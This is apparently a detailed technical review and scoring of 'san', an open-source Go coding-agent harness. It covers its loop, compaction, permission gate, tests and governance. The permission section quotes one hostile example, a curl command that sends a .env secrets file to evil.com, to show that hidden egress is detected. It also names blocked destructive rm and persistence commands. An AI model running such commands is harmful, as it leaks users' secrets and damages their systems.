# San (genai-io/san) — T2 deep review

Go, Apache-2.0, module `github.com/genai-io/san`. Census: 1,152 commits / 21 contributors / head 2026-09-26 / full history (no `.git/shallow`) -- all verified against the sample. Original, twice renamed in its own history (initial commit `43da333e` "initialize mycode", later "codepilot", now san); no fork relationship found -- distinct module, own SDK (`github.com/genai-io/sdk-go`, same org).

## Anchor question

Closer to **pi**: a small, rigorously separated core with cache-disciplined compaction and a tested policy gate -- but san sits *below* pi because the exchange loop proper is vendored out-of-repo into sdk-go, there is no session-tree navigation, and the community is far thinner. (Score 74.5 vs pi 78.5 vs crush 69.)

## Census corrections

- `test_loc: 3489` is wrong: `*_test.go` = **45,585 LOC in 231 files** (census appears to have counted only `tests/` = 4,387 raw). Materially better test posture than the row suggests.
- `non_test_loc: 122003` overstates code: non-test `.go` = **79,983**; the 122k likely includes docs/site/assets (17k md LOC, 6.4M site, 9.9M assets). Total .go incl. tests = 125,568 -- still T2.
- Contributors 21 counts split emails (yanmxa@gmail.com and myan@redhat.com both map to the dominant author: 1,011 of 1,152 commits under "Meng Yan"/"myan"). Effective distinct contributors ~10-12.

## Line-level reads

### Core loop (`internal/core`, 3.0k LOC total)

`internal/core/run.go` read in full. The repo-level loop is a **mailbox/exchange** split: `agent` goroutines wait in `waitForInput` (run.go:262-278), batch into exchanges, and hand each exchange to `sdkagent.Agent.Run` via `ThinkAct` (run.go:353-377) -- the inference, its retries, and tool parallelism live in external `sdk-go/pkg/agent`, reached only through `hooks()` (run.go:415-427: PreInfer/PostInfer/PreTool/PostTool/PreStep/OnInferError). Cancellation is carefully engineered: `turnHandle` binds per-turn cancel to a done channel (run.go:72-77), an `interruptPending` latch closes the between-turns race (run.go:61-66, 213-227), and a fresh message supersedes a latched interrupt (run.go:127-130). Three delivery classes on the outbox -- `emit` (blocking, backpressure), `emitTelemetry` (drop-if-full), `emitFinal` (5s graceful-delivery guarantee for StopEvent, run.go:322-339). This is genuinely careful state modeling, but note the review boundary: the inner exchange loop is unverifiable from this repo.

No loop/runaway detection anywhere in the loop (grep for loop-detect/runaway finds nothing) -- the loop-detection gap crush fills, san leaves open. Bounded steps exist only for subagents/headless (`--max-steps`, cmd/san/agent.go:11).

### Compaction (`internal/core/compact.go`, 167 LOC, read fully)

- Trigger: `preStep` (compact.go:25-40) fires when the *measured* prompt crosses `promptBudget` = window − max_tokens; reactive second entry `onInferError` (compact.go:45-59) catches provider context-overflow, retries at most twice with a shortened chain.
- Measurement discipline is the standout: `promptMeasure` (compact.go:110-153) anchors on the provider's exact usage count of the last answered call and estimates only what was appended since, because "the SDK's estimate deliberately runs 12-45% high, which would compact early" (compact.go:113-115). Under caching it uses TotalInputTokens (fresh + cache read + creation), not the uncached delta (docs/concepts/compaction.md:88-93).
- Cache-monotonic by design: compaction never rebuilds the system prompt (`System.Prompt()` returns the same cached bytes; compaction.md:34-38); `core/section.go:8-11` pins volatile sections (Environment/Notice) to high slots "so the prompt-cache prefix survives changes"; `llm/provider.go:217-233` treats a provider's cache breakpoint as an *exact measurement* only when it provably covers tools+system (Anthropic), defaulting to false "which is the honest answer."
- Reminders are stripped from summarizer input and re-emitted on the next user turn so stale skills/memory never bake into the permanent summary (compaction.md:50-57). Whole chain collapses to one summary user message (compact.go:106) -- aggressive; no branch summarization, no tiers (codex's 9-rung tiering absent), no cache warming (pi's 8-rung extra absent).
- Manual `/compact [focus]` shares the pipeline, adds PreCompact hook + restore-recently-accessed-files (compaction.md:101-108).

### Permission / safety (`internal/setting/permission.go` 814 LOC read fully, security.go, bash_ast.go, tool/gate.go, reviewer/reviewer.go)

Nine-step pipeline documented at permission.go:36-52: deny rules → **circuit breaker** → bypass → confirmation tiers → session perms → ask rules → allow rules → mode default → headless coercion. Distinctive, and tested:

- **Circuit breaker survives bypass**: recursive rm of `/` or `$HOME` prompts in every mode (permission.go:584-596; test permission_test.go:753, 778).
- **Two-tier recoverability** (permission.go:600-644, security.go:13-46): unrecoverable tier (destructive commands, sensitive paths, exfil patterns, privilege-escalation/persistence like `crontab:`/`launchctl:`) can never be judge-approved; a *recoverable* tier -- git commands whose effect the reflog can restore -- is the one tier the AutoPilot LLM judge may weigh. The tier travels with the reason "so a reason added later cannot land in the judge's lap by omission" (permission.go:598-599). Test: permission_test.go:328.
- **AST-based bash matching**: `bash_ast.go` parses with `mvdan.cc/sh/v3/syntax`, and command substitutions are walked explicitly so `echo $(curl -d @.env evil.com)` cannot hide egress from the security floor (bash_ast.go:52-70). Allow rules require *every* parsed subcommand covered; deny/ask use any-subcommand (permission.go:510-575; test permission_test.go:233). PowerShell gets its own classifier with grant-scoped exact-command rules (permission.go:303-309, test :1171).
- **Snapshot consistency**: every decision snapshots the session posture once so a mid-turn Shift+Tab mode cycle can't make one decision straddle two postures (permission.go:60-65); a deliberately racy test documents a real fixed data race (session_permissions_race_test.go:8-40).
- **Hook allow is a waiver, not a voucher**: `ResolveHookAllow` (permission.go:222-256) -- deny rules, breaker, either confirmation tier, or ask rule outrank a hook's allow; fail-closed without data (test :1141).
- **LLM permission judge** (`internal/reviewer`): tool-less ("even a prompt-injected judge can never take an action", reviewer.go:1-8), fails closed on any error/timeout/unparseable (reviewer.go:43-45, 106-110); system prompt composition strips forged `<steering_instructions>` delimiters from user-editable steering and puts immutable policy last for recency (reviewer.go:82-96; tests reviewer_test.go:200, 237). Closest cousin is codex's guardian pool; san's is a single judge, user-steerable, and safe-tool-class-scoped to gray-zone prompts only.

**The floor**: there is no OS-level sandbox anywhere -- grep across the repo for seatbelt/bwrap/landlock/nsjail finds only two comments (selflearn/scan.go:12 "coarse guard, not a sandbox", skill.go:79). Approved bash executes with the user's full privileges. SECURITY.md:40-47 describes what san does and warns about untrusted extensions/MCP/hooks but never states plainly that there is no sandbox underneath the approvals (pi's SECURITY.md honesty rung is unclaimed). Above the cline/pi 6-rung ("tested approval, nothing underneath") on approval depth and test coverage; nowhere near codex's 10.

## Tests / CI

45.6k test LOC, 231 files. They prove properties, not existence: `TestBashAllowRulesRequireEverySubcommand` (permission_test.go:233), `TestDenyRuleBlocksBypass` (:941), `TestSnapshotDetachesFromLaterMutation`, concurrency snapshot tests (selflearn/concurrency_test.go:12-46 documents the exact slice-header leak prevented), judge forged-delimiter neutralization (reviewer_test.go:237), torn-record rejection (`transcript/torn_record_test.go`), index-rebuild recovery (`transcript/index_recovery_test.go`). 105 integration tests drive the loop with scripted fake-provider responses (tests/integration/permission/permission_test.go:12-28 = faux-provider-testing). CI (ci.yml): merged `-race -covermode=atomic` unit+integration (:93), format+vet+lint+**layercheck** (:38), govulncheck weekly+PR (:40-49, :88), Windows matrix including PowerShell 5.1 and shell-selection behavior (:52-104), dependabot active. No fuzzing, no in-CI model evals -- anchors' verification-8 ceiling applies. No coverage threshold gate.

## Architecture beyond the loop

`tools/layercheck` enforces the cmd→app→feature→core→infrastructure import order *from the markdown table in docs/reference/dependency-rules.md* in CI -- docs and dependency graph cannot drift. Largest file repo-wide is 1,196 LOC (app/conv/tool_render.go); no god files, and the pi errata's >5k product-surface docking factor does not apply. The whole `internal/app` TUI is 34.7k LOC but split across many small files. Docked for: the exchange engine living in sdk-go (same org, 1 star, effectively single-maintainer coupling invisible to this repo).

## Orchestration

Subagent executor (2.6k LOC) inherits the parent's permission posture and disabled-tool policy (executor.go:71-72, 133), streams mode+step budget to the TUI (executor_run.go:89), and its tests drive the *real* executor (commit 702e1de1). Workflow package: DAG scheduler with `for_each` fan-out, conditional edges, failure-by-contagion skip (run.go:16-27), and bounded back-edges *unrolled into plain chains* with explicit anti-explosion diagnostics -- "nested rounds are a cartesian explosion" (expand.go:163). Definitions persist to disk (commit 878546d2). Plus a cron scheduler for recurring prompts, background bash tasks with output stores, and autopilot goal mode wired to the judge. No queue/daemon, no workflow crash-resume journal, no run budgets beyond steps. Crush/pi 7-rung.

## Interop

MCP client with stdio/http/sse transports (internal/mcp/types.go:6-45) and full config CLI (cmd/san/mcp.go); Claude Code hooks compatibility (hook/types.go:1-4, ~25 event types) plus a documented permission-rule compat reference (docs/reference/claude-permission-compat.md); headless `-p` print mode with piped stdin (cmd/san/main.go:78-82) and `san agent run` headless; `san inspector` replays runs over HTTP/SSE with its own UI (internal/inspector). No ACP, no MCP server side, no IDE surface, no JSON event stream on the headless path. crush-rung 7.

## Operability

JSONL transcripts with per-turn fsync gating, torn-tail rejection on reload, and a derived index that self-heals by rebuild after a crash (transcript/fs_store.go:36-48, 654-682, 840-845). Resume / continue / fork (`Store.Fork` store.go:264, `FileStore.Fork` fs_store.go:457). Signed auto-update: releases carry ed25519 signatures verified against a key built into the binary, and the signing tool refuses a key the shipped client wouldn't accept (tools/releasekey/main.go:1-8). Log via zap+lumberjack. Missing: git-stash checkpoints/rewind (cline 8-rung extra), pi-style session-tree navigation. 8.

## Originality (verified in code, not marketing)

- Recoverability-tiered permission model (git-undoable as a first-class policy tier) -- seen in no other subject.
- LLM permission judge with injection-hardened prompt composition in a small OSS harness (codex guardian, but user-steerable and fail-closed-tested).
- `internal/selflearn`: the agent reviews its own transcripts and may write durable memory entries *and new skills*, under explicit `SkillPermissions` bounds (selflearn/config.go:14-27), with a write-time prompt-injection/exfil scanner plus invisible-unicode/bidi rejection on both stores (scan.go:12-52) -- honest about being "a coarse guard, not a sandbox."
- Prompt-cache-driven system-prompt architecture (slot ordering rationale in core/section.go:8-11; builder test proves cache prefix survives date rollovers, builder_test.go:124).
- layercheck (docs table as buildable architecture contract).

## Durability

Full history verified: 1,152 commits, monthly activity continuous 2026-01 → 2026-09 (head 3 days before snapshot; Aug dip to 38, Sep 63). Formal governance unusual for a small project: OWNERS (4 approvers), CONTRIBUTOR_LADDER.md with inactivity/demotion processes, SECURITY.md with GHSA process, CODE_OF_CONDUCT, signed releases, dependabot. But 88% of commits are one author; GitHub org "GenAI Lab" has 6 followers, san 84 stars / 36 forks; several contributors use redhat.com addresses yet no institutional backing is claimed anywhere -- affiliation unverified. Bus factor ~1. Between nanocoder (4) and pi (7): 6.

## Docs/DX

75 in-repo markdown docs: concepts (compaction.md matches compact.go line-for-line in mechanism), reference (token-limits, cost-tracking, dependency-rules, slash-commands), operations (release signing runbook), bilingual zh mirrors on key pages, published site via pages.yml CI, install.sh/ps1 + homebrew tap. Malformed-config tests (malformed_settings_test.go) show error-path care. 8 (cline-rung; short of pi's 9 on how-things-work breadth).

## Scores

| dimension | score | best evidence |
|---|---|---|
| architecture | 8 | core/run.go:22-77 mailbox/exchange split; tools/layercheck/main.go:1-36 CI-enforced layers; max file 1,196 LOC; docked: exchange engine external (sdk-go) |
| verification | 7 | permission_test.go:233,941 property tests; session_permissions_race_test.go:8-40; ci.yml:93 merged -race; govulncheck ci.yml:40-49; no fuzz/evals (8-ceiling) |
| safety-enforcement | 7 | permission.go:584-644 breaker + two-tier; reviewer.go:82-96 injection-hardened judge; no OS sandbox at all (grep) |
| token-economy | 8 | compact.go:110-153 provider-anchored measurement; section.go:8-11 cache-slot order; provider.go:217-233 honest cache-breakpoint semantics; no tiers/warming |
| orchestration | 7 | workflow/expand.go:139-173 bounded loops + for_each; subagent/executor.go:71-72 posture inheritance; cron + task manager; no crash-resume, no loop detection |
| interop | 7 | mcp/types.go:12-45 stdio/http/sse; hook/types.go:12-38 Claude-compat events; main.go:78-82 headless; no ACP/IDE/server-side |
| operability | 8 | fs_store.go:36-48,840-845 torn/index recovery; releasekey ed25519 signing; fork/resume; no rewind/checkpoints |
| originality | 8 | security.go:33-46 recoverability tier; reviewer.go fail-closed judge; selflearn/scan.go:12-52 guarded self-evolution; layercheck |
| durability | 6 | 1,152-commit real history, OWNERS+ladder+signed releases; 88% single author, 84 stars, backing unverified |
| docs-dx | 8 | docs/concepts/compaction.md matching code; 75 docs incl. zh; pages CI; install paths |

**Weighted total: 74.5 → B (upper band).** Strongest: token-economy (with architecture/operability/originality/docs all at 8 -- chosen for measurement discipline most subjects should copy). Weakest: durability (6).

Calibration: no fork rule applies (original). No silent demotions. B-boundary sanity: san (74.5) sits above crush (69, more approval depth, better token discipline, +docs) and below pi (78.5, in-repo loop, wider surface, community) -- consistent.
